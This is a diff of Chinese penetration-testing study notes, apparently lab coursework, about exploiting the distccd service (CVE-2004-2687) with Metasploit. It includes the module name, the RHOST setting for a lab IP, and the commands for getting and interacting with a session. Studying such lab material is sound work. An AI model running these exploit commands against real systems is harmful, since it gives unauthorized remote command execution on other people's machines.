@@ -24,13 +24,7 @@ pentesting 渗透
 3. **利用漏洞：**一旦识别出存在漏洞的服务（在本例中为 distccd），就可以使用 Metasploit 来利用该漏洞。这可能涉及在 Metasploit 中查找与 CVE-2004-2687 漏洞相关的特定模块，并使用它来获取访问权限或在远程系统上执行命令。
 4. **记录过程：**每个步骤的屏幕截图和描述至关重要。这些应该突出显示所使用的命令、收集的信息以及成功的利用（如果这是目标）。
 
-
-
-
-
 https://blcklstdbb.gitbooks.io/hackmd/content/lesson-2-samba-exploit.html
-
-
 
 ### problem2
 
@@ -55,22 +49,13 @@ use exploit/unix/misc/distcc_exec
 set RHOST 192.168.23.132
 set payload 0
 exploit -z
-
 sessions -l
 sessions -i 1
-
-
 ```
 
 怎么看是否是privileged process?
 
 distcc就不是特权进程。 
-
-
-
-
-
-
 
 ```bash
 uname -a
